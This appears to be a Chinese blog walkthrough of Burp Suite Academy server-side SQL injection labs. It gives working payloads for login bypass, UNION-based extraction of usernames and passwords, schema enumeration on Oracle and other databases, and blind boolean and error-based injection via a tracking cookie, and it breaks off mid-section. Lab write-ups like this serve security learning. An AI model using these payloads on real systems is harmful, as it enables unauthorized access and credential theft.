<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Burpsuite靶场-服务端 | css_0k的博客</title><meta name="keywords" content="博客"><meta name="author" content="css_0k"><meta name="copyright" content="css_0k"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入1.WHERE 子句中允许检索隐藏数据的 SQL 注入漏洞1-0.SELECT * FROM products WHERE category &#x3D; &amp;#x27;Gifts&amp;#x27; AND released &#x3D; 1  随便点一个可以发现get传参category，猜测此为注入点 利用or的特性： 1&amp;#x27; or 1&#x3D;1--  2.允许绕过登录的 SQL 注入漏洞__干扰登录逻辑找到">
<meta property="og:type" content="article">
<meta property="og:title" content="Burpsuite靶场-服务端">
<meta property="og:url" content="https://css0k.github.io/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/index.html">
<meta property="og:site_name" content="css_0k的博客">
<meta property="og:description" content="SQL注入1.WHERE 子句中允许检索隐藏数据的 SQL 注入漏洞1-0.SELECT * FROM products WHERE category &#x3D; &amp;#x27;Gifts&amp;#x27; AND released &#x3D; 1  随便点一个可以发现get传参category，猜测此为注入点 利用or的特性： 1&amp;#x27; or 1&#x3D;1--  2.允许绕过登录的 SQL 注入漏洞__干扰登录逻辑找到">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg">
<meta property="article:published_time" content="2023-02-18T14:33:44.000Z">
<meta property="article:modified_time" content="2023-03-02T15:03:09.392Z">
<meta property="article:author" content="css_0k">
<meta property="article:tag" content="博客">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://css0k.github.io/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Burpsuite靶场-服务端',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-02 23:03:09'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.ax1x.com/2022/05/07/OlMpE4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">css_0k的博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Burpsuite靶场-服务端</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-02-18T14:33:44.000Z" title="Created 2023-02-18 22:33:44">2023-02-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-02T15:03:09.392Z" title="Updated 2023-03-02 23:03:09">2023-03-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Burpsuite靶场-服务端"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="1-WHERE-子句中允许检索隐藏数据的-SQL-注入漏洞"><a href="#1-WHERE-子句中允许检索隐藏数据的-SQL-注入漏洞" class="headerlink" title="1.WHERE 子句中允许检索隐藏数据的 SQL 注入漏洞"></a>1.WHERE 子句中允许检索隐藏数据的 SQL 注入漏洞</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-0.</span><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>随便点一个可以发现get传参category，猜测此为注入点</p>
<p>利用<code>or</code>的特性：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or 1=1--</span></span><br></pre></td></tr></table></figure>

<h3 id="2-允许绕过登录的-SQL-注入漏洞-干扰登录逻辑"><a href="#2-允许绕过登录的-SQL-注入漏洞-干扰登录逻辑" class="headerlink" title="2.允许绕过登录的 SQL 注入漏洞__干扰登录逻辑"></a>2.允许绕过登录的 SQL 注入漏洞__干扰登录逻辑</h3><p>找到登录页面，直接在用户名输入administrator，并通过注释将后传入的密码注释掉</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">administrator<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>

<h3 id="3-SQL注入UNION攻击，确定查询返回的列数"><a href="#3-SQL注入UNION攻击，确定查询返回的列数" class="headerlink" title="3.SQL注入UNION攻击，确定查询返回的列数"></a>3.SQL注入UNION攻击，确定查询返回的列数</h3><p>一种我非常熟悉的便是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;order by 1--</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span><span class="comment">--</span></span><br><span class="line"><span class="string">&#x27;order by 3--   //直到语句报错</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022141437052.png" alt="image-20221022141437052"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022141455285.png" alt="image-20221022141455285"></p>
<p>当4列时报错，因此可以判断一共有3列</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022141507893.png" alt="image-20221022141507893"></p>
<p>另一种官方题解：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select NULL,NULL(....)--  //此方法只有当列数为NULL的个数时才会有正常回显</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022140818020.png" alt="image-20221022140818020"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022140835565.png" alt="image-20221022140835565"></p>
<p>其实不一定全是NULL，也需要看传参的列要求吧，有的列可以是null(sql不区分大小写)，例如这个环境的第二列实验证明必须为null</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022141259355.png" alt="image-20221022141259355"></p>
<p>可以看到当select三列 的时候是有正常回显的，此种方法其他均报错</p>
<h3 id="4-SQL-注入-UNION-攻击，查找包含文本的列"><a href="#4-SQL-注入-UNION-攻击，查找包含文本的列" class="headerlink" title="4.SQL 注入 UNION 攻击，查找包含文本的列"></a>4.SQL 注入 UNION 攻击，查找包含文本的列</h3><p>首先查列数，可以看到是 3 列</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221022142051230.png" alt="image-20221022142051230"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;union select null,&#x27;aiZn9e&#x27;,null--+</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221118231552424.png" alt="image-20221118231552424"></p>
<h3 id="5-SQL注入UNION攻击，从其他表中获取数据"><a href="#5-SQL注入UNION攻击，从其他表中获取数据" class="headerlink" title="5.SQL注入UNION攻击，从其他表中获取数据"></a>5.SQL注入UNION攻击，从其他表中获取数据</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119094150716.png" alt="image-20221119094150716"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119131833117.png" alt="image-20221119131833117"></p>
<p>成功</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119131955082.png"></p>
<h3 id="6-SQL-注入-UNION-攻击，在单个列中检索多个值"><a href="#6-SQL-注入-UNION-攻击，在单个列中检索多个值" class="headerlink" title="6.SQL 注入 UNION 攻击，在单个列中检索多个值"></a>6.SQL 注入 UNION 攻击，在单个列中检索多个值</h3><p>经测试，这个回显位有两个，但第一个位置无法进行信息的搜索，会报错，所以只能用第二个位置我们所需要的信息，所以我们可以依次用第二个进行搜索</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select null,password from users--</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119133350468.png" alt="image-20221119133350468"></p>
<p>然后username和password组合使用以下，便可以登录了</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119133139330.png" alt="image-20221119133139330"></p>
<p>看看官方解法，自己做的这种方法并没有实现将用户名和密码一一对应，不要陷入误区，虽然只有这一个位置可以查询并回显，但根据我们<code>order by</code>语句测试，仍然是有两列数据的，所以我们应该做的就是将这两个字段一一对应，连接输出</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119160345737.png" alt="image-20221119160345737"></p>
<p>放上官方建议文档，这是常用数据库字符串连接的方式，所以我们就可以将两个字段进行连接回显</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119160536915.png" alt="image-20221119160536915"></p>
<h3 id="7-SQL注入攻击，查询Oracle数据库类型和版本"><a href="#7-SQL注入攻击，查询Oracle数据库类型和版本" class="headerlink" title="7.SQL注入攻击，查询Oracle数据库类型和版本"></a>7.SQL注入攻击，查询Oracle数据库类型和版本</h3><p>oracle中有一个虚表 dual</p>
<p><strong>dual表</strong>：计算表达式的值</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select NULL,NULL from dual--a</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119163057571.png" alt="image-20221119163057571"></p>
<p>这个虚表可以帮助我们寻找回显位，并找到哪一个存在我们想要查找的信息</p>
<p>然后就可以用oracle存放其版本信息的表来进行查找信息</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union SELECT banner,null FROM v$version--a</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221119164305740.png" alt="image-20221119164305740"></p>
<h3 id="8-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#8-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="8. SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>8. SQL injection attack, querying the database type and version on MySQL and Microsoft</h3><p>Mysql和Microsoft数据库查系统版本语句</p>
<table>
<thead>
<tr>
<th align="left">Oracle</th>
<th><code>SELECT banner FROM v$versionSELECT version FROM v$instance</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left">Microsoft</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td align="left">PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
<tr>
<td align="left">MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
</tbody></table>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120161626153.png" alt="image-20221120161626153"></p>
<h3 id="9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="9.SQL injection attack, listing the database contents on non-Oracle databases"></a>9.SQL injection attack, listing the database contents on non-Oracle databases</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">category<span class="operator">=</span><span class="string">&#x27;union select NULL,table_schema from information_schema.tables--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120164246045.png" alt="image-20221120164246045"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="string">&#x27;union select NULL,table_name from information_schema.tables where table_schema=&#x27;</span>public<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120164213127.png" alt="image-20221120164213127"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="string">&#x27;union select NULL,column_name from information_schema.columns where table_name=&#x27;</span>users_gkapnw<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120164140028.png" alt="image-20221120164140028"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="string">&#x27;union select username_dztyeh,password_beyjhy from users_gkapnw--+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120164116293.png" alt="image-20221120164116293"></p>
<p>成功  <img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120164801061.png" alt="image-20221120164801061"></p>
<p>总结一下，其实就是普遍的思路</p>
<p>查information_schema库中的几个表：</p>
<p> -schemata中查schema_name</p>
<p> -tables过渡table_schema和table_name</p>
<p> -columns通过where语句定位table_name 查询column_name</p>
<p>最后直接从表中查询字段信息</p>
<h3 id="10-SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#10-SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="10.SQL injection attack, listing the database contents on Oracle"></a>10.SQL injection attack, listing the database contents on Oracle</h3><ul>
<li><strong>DBA_TABLES</strong> 显示的是数据库中所有表(所有表DBA都可以操作)</li>
<li><strong>ALL_TABLES</strong> 显示与当前用户可访问的表 （只要对某个表有任何权限，即可在此视图中看到表的相关信息）</li>
<li><strong>USER_TABLES</strong> 显示当前用户拥有的表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;union select null, table_name from all_tables --+</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120215911524.png" alt="image-20221120215911524"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="string">&#x27; union select null,column_name from all_tab_columns where table_name=&#x27;</span>USERS_MOYRZS<span class="string">&#x27;--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//USERNAME_BWLDAN</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120215537825.png" alt="image-20221120215537825"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=&#x27;union select USERNAME_BWLDAN,PASSWORD_VQBCNP FROM USERS_IDHZCH--+</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221120214341095.png" alt="image-20221120214341095"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span><span class="string">&#x27;union select null,(select USERNAME_BWLDAN||&#x27;</span><span class="operator">~</span><span class="string">&#x27;||PASSWORD_VQBCNP FROM USERS_IDHZCH) from dual--+</span></span><br><span class="line"><span class="string">//不知道这个为啥不行</span></span><br></pre></td></tr></table></figure>

<h3 id="11-Blind-SQL-injection-with-conditional-responses"><a href="#11-Blind-SQL-injection-with-conditional-responses" class="headerlink" title="11.Blind SQL injection with conditional responses"></a>11.Blind SQL injection with conditional responses</h3><p>简而言之，这个盲注类型是基于条件响应，对于特定的 信息  有特定的响应，可以帮助我们判断我们的语句信息是否正确</p>
<p>这个响应信息比较具体，针对于具体的信息，比如 爆破字段名 之类的</p>
<p>划重点：如果查询返回任何行，便会有特定的响应——条件响应</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121135058225.png" alt="image-20221121135058225"></p>
<p>尝试一下，发现是真的不报错啊</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121135034552.png" alt="image-20221121135034552"></p>
<p>不太会，照着官方题解走一下理解理解</p>
<p>题目描述中说，application会跟踪cookie进行分析，并能够执行包含所提交cookie值的SQL查询</p>
<p>抓包发现有一个名为TrackingId的cookie，修改cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=Qmju1VOxwfnF2wgk&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">TrackingId=Qmju1VOxwfnF2wgk&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121155827210.png" alt="image-20221121155827210"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=Qmju1VOxwfnF2wgk&#x27;and &#x27;1&#x27;=&#x27;2</span><br><span class="line">TrackingId=Qmju1VOxwfnF2wgk&#x27; and 1 = 2 --+</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121160913407.png" alt="image-20221121160913407"></p>
<p>这样就比较明显了，布尔盲注</p>
<p>如果true则会返回<code>welcome back！</code>  这样就可以帮助我们判断字符正确与否了 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users LIMIT 1)=&#x27;</span>a</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>验证是否确实有名为users的表</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121170453791.png" alt="image-20221121170453791"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121173456511.png" alt="image-20221121173456511"></p>
<p>这里应该是正确回显为1，错误为0</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND (SELECT &#x27;</span>a<span class="string">&#x27; FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>可以验证username列中有名为administrator的字段</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span><span class="number">5</span>OP6rNBsTRGEWEYB<span class="string">&#x27;and (select &#x27;</span>a<span class="string">&#x27; from users where username=&#x27;</span>administrator<span class="string">&#x27;and length(password)=20)=&#x27;</span>a;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>可知password长度为<span class="number">20</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121174318084.png" alt="image-20221121174318084"></p>
<p>这样就可以直接跑单个字母了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and (select substring(password,§1§,1) from users where username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>§a§</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121191200919.png" alt="image-20221121191200919"></p>
<p>查看响应的长度可以辨别正确与否</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121192225778.png" alt="image-20221121192225778"></p>
<p>成功辣</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121192136555.png" alt="image-20221121192136555"></p>
<h3 id="12-Blind-SQL-injection-with-conditional-errors-具有条件错误的SQL盲注"><a href="#12-Blind-SQL-injection-with-conditional-errors-具有条件错误的SQL盲注" class="headerlink" title="12.Blind SQL injection with conditional errors  具有条件错误的SQL盲注"></a>12.Blind SQL injection with conditional errors  具有条件错误的SQL盲注</h3><p>划重点：<strong>不会</strong>根据查询是否返回任何行 做出<strong>不同的响应</strong></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121200203387.png" alt="image-20221121200203387"></p>
<p>做个测试，加上单引号之后出席那语法错误的报错</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121200209777.png" alt="image-20221121200209777"></p>
<p>再加一个单引号，正常回显</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121200452286.png" alt="image-20221121200452286"></p>
<p>但是严谨的说，我们现在并不能确定这就是SQL语句中的语法错误，所以我们用几个sql中关键字进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=gN4rYmMQ4RSNRJb0&#x27;||(SELECT &#x27;&#x27;)||&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121203743831.png" alt="image-20221121203743831"></p>
<p>出现报错，很可能是数据库类型问题，没有from也是可能错误，尝试判断数据库为oracle</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=gN4rYmMQ4RSNRJb0&#x27; union SELECT &#x27;&#x27; from dual--+</span><br><span class="line">TrackingId=gN4rYmMQ4RSNRJb0&#x27;||(SELECT &#x27;&#x27;from dual)||&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121204407185.png" alt="image-20221121204407185"></p>
<p>正常显示，确定这就是基于逻辑报错的SQL注入漏洞</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>KgpUJt4qYf2382UG<span class="string">&#x27;||(select case when (1=1) then to_char(1/0) else null end from dual)||&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221121221927435.png" alt="image-20221121221927435"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrackingId=KgpUJt4qYf2382UG&#x27;||(select case when (1=2) then to_char(1/0) else null end from dual)||&#x27;</span><br></pre></td></tr></table></figure>

